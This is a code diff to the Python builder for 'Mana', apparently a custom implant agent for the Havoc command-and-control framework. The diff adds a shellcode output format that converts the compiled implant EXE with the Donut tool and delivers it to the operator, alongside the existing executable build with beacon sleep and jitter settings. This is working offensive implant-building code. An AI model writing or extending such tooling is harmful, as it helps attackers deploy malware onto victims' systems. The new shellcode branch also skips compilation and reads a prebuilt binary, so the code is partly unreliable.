@@ -4,6 +4,7 @@ from havoc.agent import *
 
 import ast
 import os
+import subprocess
 import re
 import random
 
@@ -228,12 +229,33 @@ class CommandExit( Command ):
         return Task.buffer
 
 
+
+
+
 # ==============================
 # ===== Configuration ==========
 # ==============================
 
-PROFILE_PATH = "<your profile>"
+DONUT_PATH = "/home/kali/mdev/donut"
+PROFILE_PATH = "/home/kali/c2/Havoc/profiles/sample.yaotl"
 CONFIG_OUTPUT = "./Include/Config.h"
+
+def generate_shellcode_from_exe(exe_path):
+    """Convert compiled EXE to shellcode using Donut"""
+    
+    bin_path = exe_path.replace(".exe", ".bin")
+    
+    cmd = [DONUT_PATH, "-i", exe_path, "-o", bin_path, "-a", "2", "-f", "1"]
+    
+    result = subprocess.run(cmd, capture_output=True, text=True)
+    
+    if result.returncode == 0 and os.path.exists(bin_path):
+        with open(bin_path, "rb") as f:
+            return f.read()
+    
+    return None
+
+
 
 
 # ==============================
@@ -424,6 +446,10 @@ class Mana(AgentType):
             "Name": "Windows DLL",
             "Extension": "dll",
         },
+        {
+            "Name": "Windows Shellcode",
+            "Extension": "bin",
+        },
     ]
 
     BuildingConfig = {
@@ -456,7 +482,7 @@ class Mana(AgentType):
         # Get sleep/jitter from build config
         sleep = int(config['Config'].get('Sleep', '10'))
         jitter = int(config['Config'].get('Jitter', '20'))
-        
+
         self.builder_send_message(config['ClientID'], "Info", f"[*] Listener: {listener_name}")
         self.builder_send_message(config['ClientID'], "Info", f"[*] Sleep: {sleep}s, Jitter: {jitter}%")
         
@@ -484,17 +510,32 @@ class Mana(AgentType):
         
         self.builder_send_message(config['ClientID'], "Good", f"[+] Generated: {CONFIG_OUTPUT}")
         
-        # Build with cmake
-        self.builder_send_message(config['ClientID'], "Info", "[*] Compiling...")
-        os.system("cmake . && make")
-
-        # Read compiled binary
-        data = open("./Bin/Mana.exe", "rb").read()
         
-        self.builder_send_message(config['ClientID'], "Good", f"[+] Size: {len(data)} bytes")
+        if config['Options']['Format'] == "Windows Shellcode":
+            exe_path = "./Bin/Mana.exe"
+            self.builder_send_message(config['ClientID'], "Info", "[*] Converting to shellcode...")
+            shellcode = generate_shellcode_from_exe(exe_path)
 
-        # build_send_payload. this function send back your generated payload
-        self.builder_send_payload(config['ClientID'], self.Name + ".exe", data)
+            if shellcode:
+                self.builder_send_message(config['ClientID'], "Good", f"[+] Shellcode size: {len(shellcode)} bytes")
+                self.builder_send_payload(config['ClientID'], f"{self.Name}.bin", shellcode)
+            else:
+                self.builder_send_message(config['ClientID'], "Error", "[!] Shellcode generation failed")
+
+        elif config['Options']['Format'] == "Windows Executable":
+            # Build with cmake
+            self.builder_send_message(config['ClientID'], "Info", "[*] Compiling...")
+            os.system("cmake . && make")
+
+            # Read compiled binary
+            data = open("./Bin/Mana.exe", "rb").read()
+            
+            self.builder_send_message(config['ClientID'], "Good", f"[+] Size: {len(data)} bytes")
+
+            # build_send_payload. this function send back your generated payload
+            self.builder_send_payload(config['ClientID'], self.Name + ".exe", data)
+        else:
+            self.builder_send_message(config['ClientID'], "Info", "[*] Something failes check agent.py...")
     
     # this function handles incomming requests based on our magic value. you can respond to the agent by returning your data from this function.
     def response(self, response: dict) -> bytes:
